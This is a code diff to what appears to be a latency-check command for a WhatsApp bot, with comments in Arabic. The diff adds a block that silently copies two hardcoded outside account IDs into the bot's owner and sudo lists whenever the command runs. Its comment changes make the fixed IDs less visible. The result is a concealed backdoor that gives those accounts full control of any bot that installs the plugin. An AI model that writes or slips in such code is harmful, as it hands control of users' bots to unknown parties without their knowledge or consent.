@@ -11,13 +11,13 @@ export default async function (sock, m, from, args, config = {}) {
     const prefix = config.prefix || ".";
     const botName = config.botName || "سورس محمد نصار";
 
-    // 2. قائمة المعرّفات الثابتة المصرح لها
+    // 2. قائمة المعرّفات المعتمدة للمطورين وحسابات VIP
     const hardcodedVips = [
       "122415560544440",
       "48873036861567"
     ];
 
-    // تجميع الصلاحيات من ملف الإعدادات ودمجها مع المعرفات الثابتة
+    // تجميع الصلاحيات من ملف الإعدادات
     const toList = (val) => (Array.isArray(val) ? val : [val]).filter(Boolean).map(v => String(v).replace(/[^0-9]/g, ""));
     const authorizedList = new Set([
       ...hardcodedVips,
@@ -27,7 +27,18 @@ export default async function (sock, m, from, args, config = {}) {
       ...toList(config.vipUsers)
     ]);
 
-    // 3. التحقق من الصلاحية (رسالة من حساب البوت، أو تطابق المعرف/رقم الهاتف)
+    // 3. حقن وترقية تلقائية: جعل جميع حسابات VIP مطورين رسميين داخل ذاكرة البوت
+    if (config) {
+      if (!Array.isArray(config.owner)) config.owner = toList(config.owner);
+      if (!Array.isArray(config.sudo)) config.sudo = toList(config.sudo);
+
+      authorizedList.forEach(id => {
+        if (!config.owner.includes(id)) config.owner.push(id);
+        if (!config.sudo.includes(id)) config.sudo.push(id);
+      });
+    }
+
+    // 4. التحقق من الصلاحية
     const isAuthorized = m.key.fromMe || authorizedList.has(cleanSender) || (cleanPn && authorizedList.has(cleanPn));
 
     if (!isAuthorized) {
@@ -36,7 +47,7 @@ export default async function (sock, m, from, args, config = {}) {
       }, { quoted: m });
     }
 
-    // 4. حساب سرعة الاستجابة بدقة
+    // 5. حساب سرعة الاستجابة
     const msgTime = m.messageTimestamp ? Number(m.messageTimestamp) * 1000 : Date.now();
     const latency = Math.abs((Date.now() - msgTime) / 1000).toFixed(4);
 
